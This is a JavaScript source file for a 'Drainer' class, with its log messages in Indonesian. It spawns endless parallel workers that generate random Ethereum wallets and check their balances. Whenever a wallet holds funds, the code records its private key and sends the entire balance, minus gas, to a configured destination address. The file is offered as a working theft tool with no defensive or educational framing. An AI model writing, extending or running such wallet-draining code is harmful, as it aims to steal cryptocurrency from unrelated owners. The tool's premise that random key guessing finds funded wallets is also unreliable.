'use strict';

const { ethers } = require('ethers');
const cfg = require('./utils/config');
const { logHistory, logSuccess, saveWallet } = require('./utils/logger');

const GAS_LIMIT = cfg.gasLimit || 21000;

class Drainer {
  constructor() {
    this.dest = cfg.destinationAddress;
    this.provider = new ethers.providers.JsonRpcProvider(cfg.providerURL);
    this.totalCount = 0;
    this.successCount = 0;
    this.concurrency = cfg.concurrency || 10;
  }

  async attemptToDrain() {
    const wallet = ethers.Wallet.createRandom().connect(this.provider);
    const address = wallet.address;
    const privateKey = wallet.privateKey;

    let balance;
    try {
      balance = await wallet.getBalance();
    } catch {
      return;
    }

    const balanceEth = ethers.utils.formatEther(balance);
    const count = ++this.totalCount;

    logHistory(`#${count} | ${address} | ${balanceEth} ETH`);

    if (balance.gt(ethers.BigNumber.from(0))) {
      this.successCount++;

      saveWallet({
        attempt: count,
        address,
        privateKey,
        balance: balanceEth,
        timestamp: new Date().toISOString(),
      });

      logSuccess(`#${this.successCount} ditemukan di attempt #${count}: ${address} | ${balanceEth} ETH`);

      try {
        const gasPrice = await this.provider.getGasPrice();
        const gasCost  = gasPrice.mul(GAS_LIMIT);
        const netValue = balance.sub(gasCost);

        if (netValue.gt(0)) {
          const tx = await wallet.sendTransaction({
            to: this.dest,
            value: netValue,
            gasLimit: GAS_LIMIT,
            gasPrice,
          });
          logSuccess(`TX terkirim: ${tx.hash}`);
        } else {
          logSuccess(`Saldo tidak cukup untuk biaya gas, dilewati.`);
        }
      } catch (err) {
        logSuccess(`Gagal kirim TX: ${err.message}`);
      }
    }
  }

  async runWorker() {
    while (true) {
      await this.attemptToDrain();
    }
  }

  async run() {
    console.log(`Menjalankan ${this.concurrency} worker secara paralel...`);
    const workers = Array.from({ length: this.concurrency }, () => this.runWorker());
    await Promise.all(workers);
  }
}

module.exports = new Drainer();
